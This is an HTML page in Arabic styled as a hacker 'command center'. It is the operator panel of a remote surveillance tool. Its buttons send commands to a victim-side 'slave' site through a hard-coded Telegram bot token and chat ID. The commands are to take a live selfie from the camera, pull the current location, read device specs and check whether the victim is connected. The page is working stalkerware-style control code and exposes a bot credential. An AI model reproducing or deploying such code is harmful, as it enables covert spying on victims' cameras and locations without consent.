<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>EL-NAGM | لوحة السيطرة العالمية</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; }
        .control-panel { border: 2px solid #00ff41; display: inline-block; padding: 20px; margin-top: 50px; background: #050505; }
        .btn { display: block; width: 300px; padding: 15px; margin: 10px; background: #000; border: 1px solid #00ff41; color: #00ff41; cursor: pointer; font-weight: bold; font-size: 18px; }
        .btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 20px #00ff41; }
        .status { color: red; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <h1>EL-NAGM COMMAND CENTER</h1>
    <div class="control-panel">
        <div class="status">● النظام جاهز لإصدار الأوامر</div>
        <button class="btn" onclick="sendCommand('shot')">📸 التقاط سيلفي حي</button>
        <button class="btn" onclick="sendCommand('loc')">📍 سحب الموقع الحالي</button>
        <button class="btn" onclick="sendCommand('info')">📱 فحص مواصفات الجهاز</button>
        <button class="btn" onclick="sendCommand('ping')">📡 فحص اتصال الضحية</button>
    </div>

    <script>
        const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
        const chatId = "8754338811";

        async function sendCommand(cmd) {
            // بنبعت الأمر كرسالة عادية للبوت، والموقع التاني "العبد" هيقرأها وينفذها
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${cmd}`);
            alert("تم إرسال أمر الـ " + cmd + " بنجاح!");
        }
    </script>
</body>
</html>
